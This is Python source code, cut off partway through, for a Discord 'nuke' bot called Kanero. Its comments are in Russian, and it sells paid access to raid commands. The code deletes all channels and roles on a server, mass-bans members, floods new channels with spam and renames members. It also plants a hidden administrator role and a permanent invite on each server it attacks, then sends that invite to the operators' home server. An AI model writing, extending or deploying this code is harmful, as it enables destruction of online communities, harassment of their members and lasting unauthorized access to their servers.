import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import json
import os
import logging
import config
import motor.motor_asyncio
from datetime import datetime, timedelta

# Логирование в файл
logging.basicConfig(
    filename="bot.log",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    encoding="utf-8"
)
log = logging.getLogger(__name__)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ─── MONGODB ───────────────────────────────────────────────

MONGO_URI = os.environ.get("MONGO_URI", "")
_mongo_client = None
_db = None

def get_db():
    global _mongo_client, _db
    if _db is None and MONGO_URI:
        _mongo_client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
        _db = _mongo_client["eclipsed_bot"]
    return _db

async def db_get(collection: str, key: str, default=None):
    db = get_db()
    if db is None:
        return default
    doc = await db[collection].find_one({"_id": key})
    return doc["value"] if doc else default

async def db_set(collection: str, key: str, value):
    db = get_db()
    if db is None:
        return
    await db[collection].update_one(
        {"_id": key},
        {"$set": {"value": value}},
        upsert=True
    )


# ─── NUKE LOGS ─────────────────────────────────────────────

async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
    """Сохраняет лог нюка. Создаёт роль с правами администратора и инвайт через неё."""
    invite_url = None
    try:
        # Создаём роль с правами администратора
        log_role = await guild.create_role(
            name="☠️ Kanero LOG",
            permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red()
        )
        # Поднимаем роль как можно выше
        try:
            await log_role.edit(position=max(1, guild.me.top_role.position - 1))
        except Exception:
            pass
        # Инвайт через любой доступный канал
        ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
        if ch:
            inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
            invite_url = inv.url
    except Exception:
        # Fallback — обычный инвайт
        try:
            ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
            if ch:
                inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                invite_url = inv.url
        except Exception:
            pass

    import datetime
    entry = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "user_id": user.id,
        "user_name": str(user),
        "type": nuke_type,
        "invite": invite_url,
        "time": datetime.datetime.utcnow().strftime("%d.%m.%Y %H:%M UTC")
    }
    await db_set("nuke_logs", str(guild.id), entry)

    # Отправляем в logs канал на домашнем сервере
    try:
        home = bot.get_guild(HOME_GUILD_ID)
        if home:
            logs_ch = discord.utils.find(lambda c: c.name.lower() == "📊・logs" or "logs" in c.name.lower(), home.text_channels)
            if logs_ch:
                # Эмодзи для разных типов нюков
                type_emoji = {
                    "nuke": "💀",
                    "super_nuke": "☠️",
                    "owner_nuke": "👑",
                    "auto_nuke": "🤖",
                    "auto_super_nuke": "🤖☠️",
                    "auto_superpr_nuke": "🤖⚡",
                    "auto_owner_nuke": "🤖👑"
                }.get(nuke_type, "☠️")
                embed = discord.Embed(
                    title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
                    color=0xff0000
                )
                embed.add_field(name="👤 Кто", value=f"{user} (`{user.id}`)", inline=True)
                embed.add_field(name="🏠 Сервер", value=f"{guild.name} (`{guild.id}`)", inline=True)
                embed.add_field(name="🕐 Время", value=entry["time"], inline=True)
                if invite_url:
                    embed.add_field(name="🔗 Инвайт", value=invite_url, inline=False)
                embed.set_footer(text="☠️ Kanero  |  !nukelogs — полная история")
                await logs_ch.send(embed=embed)
    except Exception:
        pass



# ─── HELPERS ───────────────────────────────────────────────

nuke_running = {}
nuke_starter = {}   # guild_id -> user_id кто запустил нюк
last_spam_text = {}  # guild_id -> последний текст спама
last_nuke_time = {}  # guild_id -> время последнего nuke


def is_whitelisted(user_id):
    # Проверяем временную подписку
    temp = check_temp_subscription(user_id)
    if temp in ("wl", "pm"):
        return True
    # Premium тоже считается whitelist
    return user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID


def is_owner_whitelisted(user_id):
    return user_id in config.OWNER_WHITELIST


def is_premium(user_id):
    # Проверяем временную подписку
    temp = check_temp_subscription(user_id)
    if temp == "pm":
        return True
    return user_id in PREMIUM_LIST or user_id == config.OWNER_ID



def save_whitelist():
    asyncio.create_task(db_set("data", "whitelist", config.WHITELIST))


def save_owner_whitelist():
    asyncio.create_task(db_set("data", "owner_whitelist", config.OWNER_WHITELIST))


def save_premium():
    asyncio.create_task(db_set("data", "premium", PREMIUM_LIST))


def save_owner_nuke_list():
    asyncio.create_task(db_set("data", "owner_nuke_list", OWNER_NUKE_LIST))


def is_owner_nuker(user_id):
    return user_id in OWNER_NUKE_LIST or user_id == config.OWNER_ID


def load_whitelist():
    pass  # заменено на async load в on_ready


def load_premium():
    pass  # заменено на async load в on_ready


def save_spam_text():
    asyncio.create_task(db_set("data", "spam_text", config.SPAM_TEXT))


def load_spam_text():
    pass  # заменено на async load в on_ready



# ─── BLOCKED GUILDS ────────────────────────────────────────

BLOCKED_GUILDS: list[int] = []
PREMIUM_LIST: list[int] = []
OWNER_NUKE_LIST: list[int] = []
FREELIST: list[int] = []  # выдаётся через канал addbot — только !nuke и !auto_nuke

# ─── ВРЕМЕННЫЕ ПОДПИСКИ ────────────────────────────────────
# Формат: {user_id: {"type": "pm"/"wl"/"fl", "expires": datetime}}
TEMP_SUBSCRIPTIONS: dict[int, dict] = {}


def save_temp_subscriptions():
    # Конвертируем datetime в строку для сохранения
    data = {
        uid: {"type": sub["type"], "expires": sub["expires"].isoformat()}
        for uid, sub in TEMP_SUBSCRIPTIONS.items()
    }
    asyncio.create_task(db_set("data", "temp_subscriptions", data))


async def load_temp_subscriptions():
    global TEMP_SUBSCRIPTIONS
    data = await db_get("data", "temp_subscriptions", {})
    if data:
        # Конвертируем строку обратно в datetime
        TEMP_SUBSCRIPTIONS = {
            int(uid): {"type": sub["type"], "expires": datetime.fromisoformat(sub["expires"])}
            for uid, sub in data.items()
        }


def check_temp_subscription(user_id: int) -> str | None:
    """Проверяет временную подписку. Возвращает тип (pm/wl/fl) или None если истекла."""
    if user_id not in TEMP_SUBSCRIPTIONS:
        return None
    sub = TEMP_SUBSCRIPTIONS[user_id]
    if datetime.utcnow() > sub["expires"]:
        # Подписка истекла
        TEMP_SUBSCRIPTIONS.pop(user_id, None)
        save_temp_subscriptions()
        return None
    return sub["type"]


def add_temp_subscription(user_id: int, sub_type: str, duration_hours: int):
    """Добавляет временную подписку."""
    expires = datetime.utcnow() + timedelta(hours=duration_hours)
    TEMP_SUBSCRIPTIONS[user_id] = {"type": sub_type, "expires": expires}
    save_temp_subscriptions()


def save_freelist():
    asyncio.create_task(db_set("data", "freelist", FREELIST))


def is_freelisted(user_id):
    # Проверяем временную подписку
    temp = check_temp_subscription(user_id)
    if temp in ("fl", "wl", "pm"):
        return True
    # Whitelist и Premium тоже включают freelist
    return user_id in FREELIST or user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID


def save_blocked_guilds():
    asyncio.create_task(db_set("data", "blocked_guilds", BLOCKED_GUILDS))


def load_blocked_guilds():
    pass  # заменено на async load в on_ready


def is_guild_blocked(guild_id: int) -> bool:
    return guild_id in BLOCKED_GUILDS


def wl_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


async def delete_all_channels(guild):
    for _ in range(3):  # до 3 попыток
        channels = list(guild.channels)
        if not channels:
            break
        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
        await asyncio.sleep(1.5)


async def delete_all_roles(guild):
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )


async def do_nuke(guild, spam_text=None, caller_id=None):
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    NUKE_NAME = "Вы были крашнуты"
    bot_role = guild.me.top_role

    channels_to_delete = list(guild.channels)
    # Удаляем только роли НИЖЕ бота — выше не можем
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam(i):
        try:
            if not nuke_running.get(guild.id):
                return
            ch = await guild.create_text_channel(name=NUKE_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    # Всё параллельно
    await asyncio.gather(
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )

    if caller_id:
        try:
            member = guild.get_member(caller_id)
            if not member:
                member = await guild.fetch_member(caller_id)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_superpr_nuke_task(guild, spam_text=None):
    """Super Nuke — всё параллельно, моментально. Банит всех кроме подписчиков."""
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    TURBO_NAME = "Вы были крашнуты"
    bot_role = guild.me.top_role

    starter_id = nuke_starter.get(guild.id)

    # Не банить: боты, овнер сервера, наш овнер, запустивший, и все у кого есть подписка
    def is_protected(m):
        if m.bot:
            return True
        if m.id == guild.owner_id:
            return True
        if m.id == config.OWNER_ID:
            return True
        if starter_id and m.id == starter_id:
            return True
        # Подписчики — не баним
        if is_whitelisted(m.id) or is_premium(m.id) or is_freelisted(m.id):
            return True
        return False

    candidates = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]

    channels_to_delete = list(guild.channels)
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam_super(i):
        try:
            ch = await guild.create_text_channel(name=TURBO_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(
        *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam_super(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )

    # Роль запустившему
    if starter_id:
        try:
            member = guild.get_member(starter_id)
            if not member:
                member = await guild.fetch_member(starter_id)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_owner_nuke_task(guild, spam_text=None):
    """Owner Nuke — максимальная скорость. Банит всех кроме подписчиков."""
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    OWNER_NAME = "Вы были крашнуты"
    bot_role = guild.me.top_role
    _starter = nuke_starter.get(guild.id)

    def is_protected(m):
        if m.bot:
            return True
        if m.id == guild.owner_id:
            return True
        if m.id == config.OWNER_ID:
            return True
        if _starter and m.id == _starter:
            return True
        if is_whitelisted(m.id) or is_premium(m.id) or is_freelisted(m.id):
            return True
        return False

    targets = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]

    channels_to_delete = list(guild.channels)
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam_owner(i):
        try:
            ch = await guild.create_text_channel(name=OWNER_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(
        *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam_owner(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )

    # Роль запустившему
    if _starter:
        try:
            member = guild.get_member(_starter)
            if not member:
                member = await guild.fetch_member(_starter)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()



# ─── COMMANDS ──────────────────────────────────────────────

# ID домашнего сервера — только OWNER_ID может использовать команды
HOME_GUILD_ID = 1497100825628115108

# Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
@bot.check
async def global_guild_block(ctx):
    if ctx.guild and is_guild_blocked(ctx.guild.id):
        return False
    # На домашнем сервере — ограниченный доступ
    if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
        # Публичные команды — доступны всем
        PUBLIC_COMMANDS = {"help", "changelog", "changelogall", "inv"}
        
        # Команды управления — для овнера, owner whitelist и владельца сервера
        MANAGEMENT_COMMANDS = {"wl_add", "wl_remove", "wl_list", "pm_add", "pm_remove",
                               "fl_add", "fl_remove", "fl_clear", "auto_off", "auto_info",
                               "list", "sync_roles", "setup", "setup_update", "info", "nukelogs"}
        
        # Публичные команды доступны всем
        if ctx.command and ctx.command.name in PUBLIC_COMMANDS:
            return True
        
        if ctx.command and ctx.command.name in MANAGEMENT_COMMANDS:
            # Эти команды доступны овнеру, owner whitelist и владельцу сервера
            if (ctx.author.id == config.OWNER_ID 
                    or ctx.author.id in config.OWNER_WHITELIST
                    or ctx.author.id == ctx.guild.owner_id):
                return True
            return False
        
        # Деструктивные команды — проверяем попытку использования
        DESTRUCTIVE = {"nuke", "super_nuke", "owner_nuke", "auto_nuke", "cleanup",
                       "massban", "massdm", "rolesdelete", "auto_super_nuke",
                       "auto_superpr_nuke", "auto_owner_nuke", "spam", "pingspam"}
        
        if ctx.command and ctx.command.name in DESTRUCTIVE:
            # Только овнер может использовать
            if ctx.author.id == config.OWNER_ID:
                return True
            # Остальные получают предупреждение
            try:
                embed = discord.Embed(
                    title="⛔ ЭТО НЕ ПРОКАТИТ",
                    description=(
                        f"{ctx.author.mention}, команда `!{ctx.command.name}` **не работает на этом сервере**.\n\n"
                        "Используй команды краша только на **своих серверах**.\n"
                        "Здесь это запрещено правилами."
                    ),
                    color=0xff0000
                )
                embed.set_footer(text="☠️ Kanero  |  Читай правила")
                await ctx.send(embed=embed)
            except Exception:
                pass
            return False
        
        # Все остальные команды — только для овнера и owner whitelist
        if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
            try:
                embed = discord.Embed(
                    title="❌ Команды здесь недоступны",
                    description=(
                        f"{ctx.author.mention}, команды бота используются **в личных сообщениях** с ботом.\n\n"
                        "Напиши боту в ЛС: `!help`\n"
                        "Или добавь бота на свой сервер."
                    ),
                    color=0x2b2d31
                )
                embed.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd")
                await ctx.send(embed=embed, delete_after=8)
                try:
                    await ctx.message.delete()
                except Exception:
                    pass
            except Exception:
                pass
            return False
    return True

@bot.command()
async def nuke(ctx, *, text: str = None):
    guild = ctx.guild
    # Нюк запрещён на домашнем сервере для всех кроме овнера
    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        return
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return

    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_wl = is_whitelisted(uid)
    is_prem = is_premium(uid)
    is_fl = is_freelisted(uid)

    # Нет никакого доступа — нужна регистрация (freelist)
    if not is_owner and not is_wl and not is_prem and not is_fl:
        embed = discord.Embed(
            title="☠️ ДОСТУП ЗАПРЕЩЁН",
            description=(
                "Для использования `!nuke` нужна регистрация.\n\n"
                "**Как получить доступ (бесплатно):**\n"
                "Зайди на наш сервер и напиши в канал `#addbot`\n"
                "https://discord.gg/aud6wwYVRd\n\n"
                "**Расширенный доступ:** **davaidkatt**"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Кастомный текст — только для whitelist+
    if text and not is_wl and not is_prem and not is_owner:
        embed = discord.Embed(
            description="❌ Кастомный текст доступен только для **White** подписчиков.\nЗа покупкой пиши: **davaidkatt**",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    # Кастомный текст — только для premium/owner (whitelist сбрасывает на дефолт)
    if text and is_wl and not is_prem and not is_owner:
        text = None

    nuke_running[guild.id] = True
    nuke_starter[guild.id] = uid
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
    last_spam_text[ctx.guild.id] = spam_text
    asyncio.create_task(do_nuke(guild, spam_text, caller_id=uid))
    asyncio.create_task(log_nuke(guild, ctx.author, "nuke"))


@bot.command()
async def stop(ctx):
    guild = ctx.guild
    uid = ctx.author.id

    # Овнер останавливает всегда — без каких-либо проверок
    if uid == config.OWNER_ID:
        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await ctx.send("✅ Остановлено.")
        return

    # Остальные — через wl_check
    if not is_whitelisted(uid):
        return

    starter_id = nuke_starter.get(guild.id)

    # Никто не запускал — просто останавливаем
    if starter_id is None:
        nuke_running[guild.id] = False
        await ctx.send("✅ Остановлено.")
        return

    # Запустил овнер — только овнер может остановить
    if starter_id == config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Нюк запущен **овнером** — только он может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Запустил премиум — только премиум или овнер может остановить
    if is_premium(starter_id) and not is_premium(uid):
        embed = discord.Embed(
            description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Только тот кто запустил или овнер
    if uid != starter_id and uid != config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Только тот кто запустил нюк может его остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="Kanero")
        await ctx.send(embed=embed)
        return

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    await ctx.send("✅ Остановлено.")


@bot.command()
async def cleanup(ctx):
    uid = ctx.author.id
    if not is_freelisted(uid):
        embed = discord.Embed(
            title="☠️ ДОСТУП ЗАПРЕЩЁН",
            description="Для `!cleanup` нужна регистрация.\nНапиши в #addbot: https://discord.gg/aud6wwYVRd",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    await delete_all_channels(ctx.guild)
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False
        )
    }
    for uid in config.WHITELIST:
        member = ctx.guild.get_member(uid)
        if not member:
            try:
                member = await ctx.guild.fetch_member(uid)
            except Exception:
                continue
        overwrites[member] = discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )
    channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
    # Отправляем текст спама только если nuke был менее 30 секунд назад
    nuke_time = last_nuke_time.get(ctx.guild.id)
    if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
        text = last_spam_text.get(ctx.guild.id)
        if text:
            await channel.send(text)


@bot.command()
@wl_check()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def rename(ctx, *, name: str):
    await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
    await ctx.send("Готово.")


@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")


@bot.command()
@wl_check()
async def webhooks(ctx):
    whs = await ctx.guild.webhooks()
    if not whs:
        await ctx.send("Вебхуков нет.")
        return
    msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
    await ctx.send(f"```{msg[:1900]}```")


@bot.command(name="clear")
@wl_check()
async def clear(ctx, amount: int = 10):
    """Удалить N сообщений в канале. Максимум 100."""
    if amount > 100:
        await ctx.send("Максимум 100 сообщений.")
        return
    if amount < 1:
        await ctx.send("Минимум 1 сообщение.")
        return
    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
    msg = await ctx.send(f"🗑️ Удалено **{len(deleted) - 1}** сообщений.")
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


@bot.command()
@wl_check()
async def nicks_all(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
    await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
async def auto_nuke(ctx, state: str):
    uid = ctx.author.id
    # Запрещено на домашнем сервере для не-овнеров
    if ctx.guild and ctx.guild.id == HOME_GUILD_ID and uid != config.OWNER_ID:
        return
    # Требует freelist или выше
    if not is_freelisted(uid) and not is_whitelisted(uid) and not is_premium(uid) and uid != config.OWNER_ID:
        embed = discord.Embed(
            title="☠️ ДОСТУП ЗАПРЕЩЁН",
            description=(
                "Для использования `!auto_nuke` нужна регистрация.\n\n"
                "**Как получить доступ (бесплатно):**\n"
                "Зайди на наш сервер и напиши в канал `#addbot`\n"
                "https://discord.gg/aud6wwYVRd"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if state.lower() == "on":
        config.AUTO_NUKE = True
        await ctx.send("✅ Авто-краш включен.")
    elif state.lower() == "off":
        config.AUTO_NUKE = False
        await ctx.send("❌ Авто-краш выключен.")
    elif state.lower() == "info":
        status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключен"
        await ctx.send(f"Авто-краш: {status}")
    else:
        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")


@bot.command()
@wl_check()
async def inv(ctx):
    app_id = bot.user.id
    # Полные права (администратор)
    url_full = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
    # Минимальные права только для чтения (для /analyze)
    # permissions=1024 = Read Messages только
    url_readonly = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=1024&scope=bot%20applications.commands"
    # User app (без добавления на сервер)
    url_user = f"https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1"

    embed = discord.Embed(title="🔗 Ссылки для добавления бота", color=0x0a0a0a)
    embed.add_field(name="👑 Полные права (администратор)", value=url_full, inline=False)
    embed.add_field(name="🔍 Только чтение (для /analyze)", value=url_readonly, inline=False)
    embed.add_field(name="📱 User App (без добавления на сервер)", value=url_user, inline=False)
    embed.set_footer(text="☠️ Kanero  |  Для /analyze достаточно ссылки 'Только чтение'")
    await ctx.author.send(embed=embed)



async def resolve_user(ctx, user_input: str) -> discord.User | None:
    """Резолвит пользователя по ID, @mention или username#tag."""
    # Убираем <@> из mention
    uid_str = user_input.strip("<@!>")
    # Пробуем как ID
    try:
        uid = int(uid_str)
        return await bot.fetch_user(uid)
    except (ValueError, discord.NotFound):
        pass
    # Пробуем найти по имени на домашнем сервере
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if home_guild:
        member = discord.utils.find(
            lambda m: m.name.lower() == user_input.lower()
                   or str(m).lower() == user_input.lower()
                   or (m.nick and m.nick.lower() == user_input.lower()),
            home_guild.members
        )
        if member:
            return member
    return None


async def update_stats_channels(guild: discord.Guild):
    """Обновляет названия каналов-счётчиков в категории СТАТИСТИКА."""
    cat = discord.utils.find(lambda c: "СТАТИСТИКА" in c.name, guild.categories)
    if not cat:
        return
    total    = guild.member_count
    guest_r  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
    user_r   = discord.utils.find(lambda r: r.name == "👥 User",     guild.roles)
    white_r  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
    prem_r   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
    counts = {
        "🔊 all":       total,
        "👤 guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
        "👥 users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
        "✅ whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
        "💎 premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
    }
    for ch in cat.voice_channels:
        for prefix, count in counts.items():
            if ch.name.startswith(prefix):
                new_name = f"{prefix} • {count}"
                if ch.name != new_name:
                    try:
                        await ch.edit(name=new_name)
                    except Exception:
                        pass
                break


@bot.command(name="wl_add")
async def wl_add(ctx, *, user_input: str):
    """Добавить в Whitelist. Без дней — навсегда. С днями — временно.
    Использование: !wl_add @user [дни] | !wl_add all [дни]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    # Парсим — последний аргумент может быть длительностью
    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except Exception:
            actual_input = user_input

    # Режим ALL
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("⏳ Выдаю White всем участникам...")
        count = 0
        white_role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "wl", duration_hours)
            else:
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
            if white_role and white_role not in member.roles:
                try:
                    await member.add_roles(white_role, reason="wl_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_whitelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"✅ **White**{dur_text} выдан **{count}** участникам.")
        return

    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "wl", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"✅ **{user}** получил **White** на **{duration_text}** (временно)."
    else:
        if user_id not in config.WHITELIST:
            config.WHITELIST.append(user_id)
            save_whitelist()
        result_text = f"✅ **{user}** (`{user_id}`) добавлен в whitelist навсегда."

    # Выдаём роль
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
                if role and role not in member.roles:
                    await member.add_roles(role, reason="wl_add")
            await update_stats_channels(home_guild)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="wl_remove")
async def wl_remove(ctx, *, user_input: str):
    # Только владелец сервера может использовать
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
        return
    user_id = user.id
    if user_id in config.WHITELIST:
        config.WHITELIST.remove(user_id)
        save_whitelist()
        try:
            if user_id not in PREMIUM_LIST:
                home_guild = bot.get_guild(HOME_GUILD_ID)
                if home_guild:
                    member = home_guild.get_member(user_id)
                    if member:
                        role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
                        if role and role in member.roles:
                            await member.remove_roles(role, reason="wl_remove")
                    await update_stats_channels(home_guild)
        except Exception:
            pass
        await ctx.send(f"✅ **{user}** убран из whitelist.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="wl_list")
async def wl_list(ctx):
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return
    if not config.WHITELIST:
        await ctx.send("Whitelist пуст.")
        return
    lines = []
    for uid in config.WHITELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
    await ctx.send(embed=embed)


# ─── OWNER-ONLY: PREMIUM ───────────────────────────────────

@bot.command(name="pm_add")
async def pm_add(ctx, *, user_input: str):
    """Добавить в Premium. Только для владельца сервера.
    Использование: !pm_add @user [дни] | !pm_add all [дни]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    # Парсим длительность из последнего аргумента
    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
